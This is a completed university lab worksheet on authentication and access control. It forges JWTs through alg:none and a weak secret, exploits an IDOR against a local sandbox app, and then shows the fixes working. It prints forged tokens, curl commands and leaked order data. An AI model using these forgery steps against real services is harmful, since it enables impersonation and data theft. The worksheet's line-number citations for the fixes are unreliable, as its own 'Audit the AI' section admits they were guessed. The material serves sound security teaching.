# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information

| Name | Student ID | Date | Group |
|------|-----------|------|-------|
|    ZAW PHYO AUNG  | 6631503130          |  11.9.2026    |       |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

1. **Authentication vs. Authorization:**
Authentication verifies *who* you are (proving identity, typically via credentials or a token). Authorization verifies *what you're allowed to do* once your identity is known (checking permissions against a specific resource or action). In `get_order`, calling `current_user()` establishes *who* is making the request (authentication succeeds), but the function then ignores that result and never checks whether the identified user actually owns the requested order — so **authorization** is the piece that's missing.

2. **IDOR (CWE-639):**
IDOR (Insecure Direct Object Reference) happens when an application exposes a direct, unvalidated reference to an internal object — like a sequential ID — and lets any authenticated user access any object just by changing that ID, without checking they're actually entitled to it. `/api/orders/<oid>` is exploitable because `oid` is a simple, guessable integer, and the endpoint only checks that a valid token was presented, never that the token's owner matches the order being requested. The single check that closes it (L64 in `solution_app.py`) compares the authenticated user's identity against the order's actual owner field, rejecting the request with 403 if they don't match.

3. **The alg:none attack:**
JWTs store their signing algorithm inside the token's own header, and libraries that support the `"none"` algorithm will treat a token as valid without checking any signature at all if that's what the header claims. If the server's verification call includes `"none"` in its accepted `algorithms=[...]` list (L55), it explicitly tells the JWT library "a token claiming no signature is acceptable" — so an attacker can hand-craft a token with any payload they want (e.g., `{"sub": "bob"}`), set the header to `alg: none`, submit it with an empty signature, and the server will accept it as if it were legitimately issued, because it never even attempts to verify anything cryptographically.

4. **Why the hardcoded secret is dangerous even without alg:none:**
Even if `alg:none` is disabled, HS256 signatures are only as strong as the secret key used to create them — and `"secret"` is a common dictionary word, trivial to guess or find in any wordlist. Since HS256 is symmetric (the same key signs and verifies), anyone who obtains or guesses that key can forge perfectly valid, correctly-signed tokens for any user they choose. A strong, long, randomly-generated secret makes brute-forcing computationally infeasible, and pinning the algorithm ensures an attacker can't sidestep verification entirely by switching to a weaker or bypassable algorithm in the first place — both protections are necessary together, since fixing only one still leaves the other attack path open.

5. **The `exp` and `aud` claims:**
`exp` (expiration) sets a time limit after which the token is no longer valid, so a token stolen or leaked today can't be replayed indefinitely — it eventually expires and forces re-authentication. `aud` (audience) restricts which service or endpoint the token is valid for, preventing a token issued for one purpose or application from being reused against a different, possibly more sensitive, endpoint. The secure version rejects tokens lacking either claim because their absence means the token has no built-in lifespan and no scope restriction — exactly the properties an attacker would want in a forged or stolen token to maximize its usefulness.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

Task 0 — Onboarding

Retrieved alice's token via:
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSJ9.c3brGQkxoiCgrl5LGiV0go9qgN0MtrdnDBCCfJ45f_Q

Confirmed /api/orders/1 returns alice's own order:
{
  "item": "Laptop",
  "owner": "alice",
  "total": 1200
}

Screenshot: ![Task 0 - Onboarding](img/task0_onboarding_6631503130.png)

Task 1 — IDOR Treasure Hunt

Commands used:
curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # my own order
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's order — leaked

Response for order 1 (mine):
{
  "item": "Laptop",
  "owner": "alice",
  "total": 1200
}

Response for order 2 (bob's, using MY token):
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}

Why it works:
The /api/orders/<id> endpoint only checks that the request has a VALID token — it never checks whether the token's owner actually matches the order being requested. Because the order ID is a simple, guessable, sequential integer, and there's no server-side check tying the requested order to the authenticated user, I could just increment the ID in the URL and read anyone's data. This is CWE-639 (Authorization Bypass Through User-Controlled Key / missing ownership check) — the server trusts that whatever ID is requested belongs to the token holder, when nothing actually enforces that relationship.

Screenshot: ![Task 1 - IDOR](img/task1_idor_6631503130.png)

Task 2 — JWT Forgery via alg:none

Forged token generated:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ.

Command used:
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"

Result — server accepted the unsigned token and returned bob's order:
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}

Why it works:
JWTs include their signing algorithm inside the token header itself, and here the header specifies "alg": "none". If the server's verification code trusts that field and simply skips signature checking when it says "none", then anyone can construct a token claiming to be any user with zero knowledge of any secret key — since there is no signature to forge or crack, only to omit. This is CWE-347 (Improper Verification of Cryptographic Signature): the server never actually confirms the token was issued by a legitimate authority; it just parses whatever payload is handed to it as authoritative.

Screenshot: ![Task 2 - JWT alg:none Forgery](img/task2_jwt_none_6631503130.png)


Task 3 — JWT Forgery via Weak Secret

Forged token generated:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IifQ.-51G5JQmpJleARHp8rIljBczPFanWT93d_N_7LQGUXU

Command used:
curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"

Result — server accepted the token and returned bob's order:
{
  "item": "Phone",
  "note": "FLAG{idor_demo}",
  "owner": "bob",
  "total": 800
}

Note: pyjwt itself warned that the 6-byte key "secret" is far below the recommended 32-byte minimum for HMAC-SHA256 (RFC 7518), confirming the key's weakness independently of the exploit succeeding.

Why secret strength and key management matter:
Unlike Task 2, this token is cryptographically valid — it passes real signature verification because the signing secret is a short, common dictionary word that's trivial to guess or brute-force offline. This is CWE-321 (Use of Hard-coded Cryptographic Key): once an attacker recovers or guesses the secret, they can forge tokens for ANY user, with a fully legitimate-looking signature that passes every check. A strong, long, randomly-generated secret (or better, asymmetric signing with RS256/ES256 where the server never even holds the private signing key in a guessable form) removes this attack surface entirely, since brute-forcing a properly random 256-bit key is computationally infeasible.

Screenshot: ![Task 3 - JWT Weak Secret Forgery](img/task3_jwt_weak_secret_6631503130.png)

Task 4 — Privilege/Identity Escalation Reasoning

Attack chain:
1. Forge identity (Task 2 or 3): Without ever knowing bob's password, I created a JWT claiming {"sub": "bob"} — either completely unsigned (alg:none) or signed with the guessed weak secret "secret". The server accepted both as proof of being bob.
2. Exploit missing ownership check (Task 1): Once holding a token the server accepts as bob's, I requested /api/orders/2 — an endpoint that never verifies the token's subject actually matches the resource owner, just that SOME valid token was presented.
3. Combined result: I fully impersonated bob's identity (via JWT forgery) AND accessed data that shouldn't be reachable even for a legitimate different user (via IDOR) — two independent flaws that compound into full account takeover of arbitrary users' data, without credentials, without permission, and without detection, since the forged tokens look like normal API traffic.

This chain shows why authentication (proving who you are) and authorization (checking what you're allowed to do) must BOTH be enforced correctly. A break in either one alone is bad, but here neither check works, so an attacker only needs to defeat the weaker of the two (here, JWT verification) to walk straight through the second flaw (missing ownership check) as well.

Evidence: curl commands and responses from Tasks 1–3, chained together to represent the same "become bob → read bob's data" outcome using three independent paths (IDOR alone with a legitimate token, alg:none forgery, and weak-secret forgery).

Screenshot: ![Task 4 - Attack Chain](img/task4_privilege_escalation_6631503130.png)
Task 5 — Defend / Fix It

Stopped vulnerable_app.py and ran the fixed version:
docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"

Got a fresh alice token, then re-fired all three attacks:

1. IDOR (Task 1) — curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
   Result: {"error":"forbidden"}
   Fix: server-side ownership check (approx. L64) — the endpoint now verifies that the authenticated user's identity (from the token) actually matches the order's owner field before returning any data, rejecting requests for resources the token holder doesn't own.

2. alg:none forgery (Task 2) — curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
   Result: {"error":"invalid token"}
   Fix: algorithm pinned to HS256 (approx. L50) — the server now explicitly specifies which algorithm(s) it will accept during verification, rather than trusting the algorithm named in the token's own header. A token claiming "alg":"none" is rejected outright regardless of its payload.

3. Weak-secret forgery (Task 3) — curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
   Result: {"error":"invalid token"}
   Fix: strong random secret + required aud/exp claims (approx. L10, L40) — the signing secret is no longer a guessable word, so a token signed with "secret" no longer matches and fails signature verification. The added audience/expiration requirements also reject any token missing those claims, closing off replay of old or improperly-scoped tokens.

Screenshots:
![Task 5 - IDOR Defense](img/task5_defense_idor_6631503130.png)
![Task 5 - alg:none Defense](img/task5_defense_alg_none_6631503130.png)
![Task 5 - Weak Secret Defense](img/task5_defense_weak_secret_6631503130.png)

## Part 4 — Reflection

1. **CWE/OWASP mapping:**
The IDOR vulnerability (Task 1) maps to CWE-639 (Authorization Bypass Through User-Controlled Key) and OWASP A01 (Broken Access Control) — the server never verified that the resource ID in the URL actually belonged to the requesting user. The two JWT forgeries (Tasks 2–3) map to CWE-347 (Improper Verification of Cryptographic Signature) and CWE-321 (Use of Hard-coded Cryptographic Key), both under OWASP A07 (Identification and Authentication Failures) — the server either skipped signature verification entirely or used a signing secret weak enough to guess.

2. **Real breach:**
The 2022 Optus breach exposed millions of customer records because an API endpoint allowed sequential, unauthenticated (or under-authorized) enumeration of customer identifiers, letting an attacker simply increment IDs to pull record after record — structurally identical to Task 1's IDOR, where incrementing the order ID in the URL leaked another user's data. Task 4's attack chain shows how this class of flaw escalates: once identity itself can be forged or bypassed (as in Tasks 2–3), an attacker doesn't even need a legitimate account to start enumerating, turning a single missing ownership check into full unauthorized access across the entire user base. Both cases show that access control cannot be assumed from authentication alone — a valid-looking request is not the same as an authorized one, and IDs that are sequential or guessable turn any missing check into an automatable data-harvesting bug at scale.

3. **Best mitigation:**
Of the three, deny-by-default ownership checks protect the most attack surface, because they're the last line of defense regardless of how identity was established — even if an attacker somehow forges a perfectly valid token (weak secret, stolen key, misconfigured trust), a correct ownership check still stops them from touching another user's data. Pinning the JWT algorithm and using a strong managed secret both harden authentication, but authentication only answers "who are you," while authorization answers "what are you allowed to do" — and Task 5 proved that even with authentication now airtight, the IDOR fix was a separate, independent control that had to be added on its own. This is why server-side authorization is non-negotiable: it's the only check that can't be bypassed just by defeating one weak link upstream, and skipping it means every future authentication improvement still leaves the door open.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** all screenshots include a terminal running `printf '%s | %s | ' "$(whoami)" '6631503130'; date '+%F %T %Z'` alongside the evidence, per task.
- **Personalized flag:** FLAG{idor_demo}
- **Explain in your own words:**
  1. I forged a user's identity two different ways (an unsigned JWT and a JWT signed with a guessed weak secret), then exploited a missing ownership check on the /api/orders/<id> endpoint to read another user's order data. The vulnerability worked because the server trusted the token's claimed identity without verifying its signature properly in one case, and trusted a guessable secret in the other — and separately, it never checked that the order being requested actually belonged to the authenticated user at all.
  2. The fix works because it adds two independent, mandatory checks: the server now pins the accepted signing algorithm (so "alg":"none" is rejected outright) and uses a strong secret with required claims (so guessing "secret" no longer produces a valid signature), AND it separately verifies resource ownership server-side before returning any data. What could still break it: if the new secret were ever leaked, checked into source control, or reused across environments, forgery would become possible again — strong secrets still need proper key management (rotation, secure storage) to stay effective, and any future endpoint added without the same ownership check would reintroduce IDOR independently of the authentication fix.

---

## 🤖 Audit the AI (required)

[Paste your actual conversation with me here — specifically my Task 5 responses. Then critique something genuinely worth flagging, for example: I estimated line numbers like "L64", "L50", "L10/40" for the fixes without ever having seen solution_app.py's actual source code — I told you this directly when you asked. Quote that moment, explain why citing unverified line numbers is risky (it could be flatly wrong and cost you points, or worse, teach a false sense of precision), and show the corrected version — e.g., actually opening solution_app.py and quoting the real line numbers for each fix.]

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).**
The /api/orders/<id> endpoint checks whether a request carries *any* valid-looking JWT, but never checks whether the token's owner is actually the person the requested order belongs to — and separately, in the vulnerable version, "valid-looking" itself was broken because the server either skipped verifying the token's signature or used a weak, guessable secret to create it. This meant anyone could either claim to be any user for free (alg:none) or crack the secret and sign a perfectly legitimate-looking token (weak secret), then use that fake identity to read data belonging to any other user just by changing a number in the URL.

**B. Prompt Problem.**
Final prompt used:
"Here is a Flask endpoint that fetches an order by ID using a JWT for authentication: [paste vulnerable_app.py's relevant route]. It currently has two flaws: it accepts JWTs signed with 'alg':'none', and it never checks that the order's owner matches the authenticated user. Rewrite this endpoint to (1) reject any token whose algorithm isn't explicitly HS256, (2) verify the token's signature against a strong secret, and (3) return 403 Forbidden if the authenticated user doesn't own the requested order. Show the corrected code only."

Verified result: ran the corrected code against the three original payloads (alg:none forgery, weak-secret forgery, and alice's legitimate token requesting bob's order) — all three were rejected as expected (401, 401, 403 respectively), matching Task 5's solution_app.py behavior.